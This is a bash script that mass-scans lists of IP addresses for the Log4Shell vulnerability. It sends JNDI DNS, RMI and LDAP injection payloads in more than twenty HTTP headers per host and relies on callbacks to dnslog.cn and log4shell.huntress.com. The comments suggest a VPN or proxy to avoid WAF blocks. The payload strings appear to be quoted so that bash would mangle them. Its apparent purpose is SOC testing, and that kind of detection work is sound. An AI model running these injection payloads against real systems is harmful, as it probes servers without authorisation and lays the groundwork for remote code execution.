#!/bin/bash

###################
# Author: Keyz
# Date:  2021-12-13
# V1.0
####################
# SIMPLE ELI5 
####################
#
# The payloads being sent will trigger DNS lookups. You can review your DNS logs to see if the Log4J module forwarded the request.
# If you do not have your own server, you can use the publiclly availbe resources which this script is set to use. (dnslog.cn and log4shell.huntress.com)
# 
# Obtain a dns subdomain from dnslog.cn and fill in the DOMAIN variable with your unique address. Do the same for log4shell.huntress.com
# 
# The script will attempt to inject all of the DNS payloads into each HEADER, for every IP listed to see if you it gets any hits. 
# Consider the fact that your IP may be blocked if there is a WAF. So consider running this from behind a VPN or a proxy.
#
#####################
# PRE-REQS
#####################
#
# The only requirement is that you have curl installed, and a file of IP addresses you would like to target.
#
# 1) To install curl please run (apt install curl -y)
# 2) Generate a subdomain at dnslog.cn and place it in the DOMAIN variable. 
# 3) Replace the HUNTRESS LDAP payload variable with your assigned UUID at log4shell.huntress.com
# 4) Because I did not include logic to check for SSL IPs, you must seperate SSL address and NONSSL addresses into two different files.
#     -- SSL_FILE should contain ports if not 443, e.g. 127.0.0.1:8443
#     -- NOSSL_FILE should contain ports if not port 80, e.g. 127.0.0.1:8080
#     -- Each IP address should be on its own line
#
# LOGGING: If you would like a copy of the output, please run the command with tee, e.g. ./scan.sh | tee -a output.txt
#
###################### 
# VARIABLES
######################
#
# [+] HEADERS are the strings that we will be injecting the payloads into.
#
# [+] DOMAIN is the DNS domain that we want to use. (dnslog.cn is quick and easy)
#
# [+] URI is a specific string that will be sent in the request. This unique URI makes log searches easier. No change needed, but feel free to do so.
#
# [+] NOSSL_FILE and SSL_FILE are the absolute paths (if not found in the local directory) to IP addresses 
# that you want to check (they should contain port numbers if not port  80, e.g. 127.0.0.1:8080)
#
# [+] HUNTRESS is the payload provided to you at log4shell.huntress.com
#
######################

HEADER=('Authorization' 'Cache-Control' 'Cf-Connecting_ip' 'Client-Ip' 'Contact' 'Cookie' 'Forwarded-For-Ip' 'Forwarded-For' 'Forwarded' 'If-Modified-Since' 'Originating-Ip' 'Referer' 'True-Client-Ip' 'User-Agent' 'X-Api-Version' 'X-Client-Ip' 'X-Forwarded-For' 'X-Leakix' 'Authorization: Basic' 'Authorization: Bearer' 'Authorization: Oauth' 'Authorization: Token')

DOMAIN=""
URI="SOCTEAM-TEST"
NOSSL_FILE=""
SSL_FILE=""
HUNTRESS=''

#####

while read -r IP
    do
    for EACH in "${HEADER[@]}"
    do
        echo -e "\n[!] Targeting:$IP with $DOMAIN/$URI"
        echo -e "\n[+] Sending $IP DNS payload. Header: $EACH\n"
        curl -I -X GET -m 2  http://$IP -H "$EACH: ${jndi:dns://$DOMAIN/$URI}"
        echo -e "\n[+] Sending $IP RMI payload. Header: $EACH\n"
        curl -I -X GET -m 2  http://$IP -H "$EACH: ${jndi:rmi://$DOMAIN/$URI}"
        echo -e "\n[+] Sending $IP  Huntress LDAP payload. Header: $EACH\n"
        curl -I -X GET -m 2  http://$IP -H "$EACH: $HUNTRESS"
    done
    done < $NOSSL_FILE

echo -e "\n[!] Starting SSL IP addresses..." && sleep 3

while read -r IP
    do
    for EACH in "${HEADER[@]}"
    do
        echo -e "\n[!] Targeting:$IP with $DOMAIN/$URI"
        echo -e "\n[+] Sending $IP DNS payload. Header: $EACH\n"
        curl -I -X GET -m 0.8 -k  https://$IP -H "$EACH: ${jndi:dns://$DOMAIN/$URI}"
        echo -e "\n[+] Sending $IP RMI payload. Header: $EACH\n"
        curl -I -X GET -m 0.8 -k  https://$IP -H "$EACH: ${jndi:rmi://$DOMAIN/$URI}"
        echo -e "\n[+] Sending $IP Huntress LDAP payload. Header: $EACH\n"
        curl -I -X GET -m 0.8 -k  https://$IP -H "$EACH: $HUNTRESS"
    done
    done < $SSL_FILE

echo -e  "\nDONE!"
echo -e  "\nPlease check DnsLog.cn and log4shell.huntress.com/view/{UUID} for results."
